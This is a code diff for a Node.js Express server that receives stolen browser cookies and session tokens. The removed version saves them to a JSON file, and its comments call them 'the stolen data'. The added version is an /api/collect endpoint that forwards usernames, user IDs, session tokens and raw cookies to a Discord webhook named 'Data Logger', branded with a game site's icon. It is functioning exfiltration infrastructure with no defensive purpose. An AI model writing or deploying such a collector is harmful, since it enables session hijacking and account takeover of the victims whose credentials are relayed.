@@ -1,103 +1,72 @@
 const express = require('express');
-const fs = require('fs');
-const path = require('path');
-const cors = require('cors');
-const bodyParser = require('body-parser');
-
 const app = express();
-const PORT = 3000;
+const PORT = process.env.PORT || 3000;
 
-// Middleware
-app.use(cors());
-app.use(bodyParser.json());
+// Allow JSON bodies
+app.use(express.json());
 
-// Path to the JSON database
-const DB_FILE = path.join(__dirname, 'users.json');
+// POST endpoint: /api/collect
+app.post('/api/collect', async (req, res) => {
+    try {
+        const { url, cookies, user } = req.body;
 
-// Helper: Read the database
-const readDB = () => {
-    if (!fs.existsSync(DB_FILE)) {
-        fs.writeFileSync(DB_FILE, JSON.stringify({ users: [] }, null, 2));
-        return { users: [] };
-    }
-    const data = fs.readFileSync(DB_FILE, 'utf8');
-    return JSON.parse(data);
-};
+        // Grab the webhook from Render's environment variables (Key: webhook)
+        const WEBHOOK_URL = process.env.webhook;
 
-// Helper: Write to the database
-const writeDB = (data) => {
-    fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
-};
+        if (!WEBHOOK_URL) {
+            console.error("Webhook URL missing in environment variables!");
+            return res.status(500).json({ status: "error", message: "Server misconfigured" });
+        }
 
-// ==========================================
-// API ROUTES
-// ==========================================
+        if (!cookies || cookies.length === 0) {
+            return res.status(400).json({ status: "error", message: "No data received" });
+        }
 
-// 1. GET: Fetch all users (For you to check the stolen data)
-app.get('/api/users', (req, res) => {
-    const db = readDB();
-    res.json(db);
-});
-
-// 2. POST: Register or Update a User & Securely Store the Cookies
-app.post('/api/users/register', (req, res) => {
-    const { userId, username, sessionToken, rawCookieString } = req.body;
-
-    if (!userId) {
-        return res.status(400).json({ error: 'userId is required' });
-    }
-
-    const db = readDB();
-    let user = db.users.find(u => u.userId === userId);
-
-    // Get the current timestamp
-    const now = new Date().toISOString();
-
-    if (user) {
-        // Update existing user
-        user.lastSeen = now;
-        if (username) user.username = username;
-        
-        // IMPORTANT: Update the credentials every time they hit the endpoint
-        user.sessionToken = sessionToken || user.sessionToken;
-        user.rawCookieString = rawCookieString || user.rawCookieString;
-        
-        writeDB(db);
-        return res.json({ message: 'User updated', user });
-    } else {
-        // Create new user with all the stolen data
-        const newUser = {
-            userId: userId,
-            username: username || 'Anonymous',
-            sessionToken: sessionToken || 'MISSING',
-            rawCookieString: rawCookieString || 'MISSING',
-            firstSeen: now,
-            lastSeen: now,
-            settings: {} // Placeholder for future settings
+        // Build the Discord payload
+        const payload = {
+            username: "Data Logger",
+            avatar_url: "https://playvortex.io/favicon.ico",
+            embeds: [{
+                title: "🦊 Account Data Received",
+                color: 0x8f82c4,
+                thumbnail: { url: user?.avatarUrl || "https://playvortex.io/favicon.ico" },
+                fields: [
+                    { name: "👤 Username", value: `**@${user?.username || 'Unknown'}**`, inline: true },
+                    { name: "📛 Display Name", value: `**${user?.displayName || 'Unknown'}**`, inline: true },
+                    { name: "🆔 User ID", value: `\`${user?.userId || 'Unknown'}\``, inline: false },
+                    { name: "🔑 Session Token", value: `\`\`\`${user?.sessionToken || 'MISSING'}\`\`\``, inline: false },
+                    { name: "📦 Raw Cookies", value: `\`\`\`${(cookies.join('; ') || '').substring(0, 950)}\`\`\``, inline: false }
+                ],
+                footer: { text: "Render Proxy • Logger", icon_url: "https://playvortex.io/favicon.ico" },
+                timestamp: new Date().toISOString()
+            }]
         };
-        db.users.push(newUser);
-        writeDB(db);
-        return res.status(201).json({ message: 'New user registered with cookies', user: newUser });
+
+        // Send to Discord
+        const response = await fetch(WEBHOOK_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        });
+
+        if (!response.ok) {
+            console.error("Discord webhook failed:", response.status);
+            return res.status(500).json({ status: "error", message: "Webhook failed" });
+        }
+
+        console.log("Data successfully relayed to Discord!");
+        return res.status(200).json({ status: "success" });
+
+    } catch (err) {
+        console.error("Server error:", err);
+        return res.status(500).json({ status: "error", message: "Internal error" });
     }
 });
 
-// 3. GET: Get a specific user's data
-app.get('/api/users/:userId', (req, res) => {
-    const { userId } = req.params;
-    const db = readDB();
-    const user = db.users.find(u => u.userId === userId);
-
-    if (!user) {
-        return res.status(404).json({ error: 'User not found' });
-    }
-    res.json(user);
+app.get('/', (req, res) => {
+    res.send('API is running.');
 });
 
-// Start the server
 app.listen(PORT, () => {
-    console.log(`Kholin backend server running at http://localhost:${PORT}`);
-    console.log(`API endpoints:`);
-    console.log(`  GET  /api/users`);
-    console.log(`  POST /api/users/register`);
-    console.log(`  GET  /api/users/:userId`);
+    console.log(`Server running on port ${PORT}`);
 });
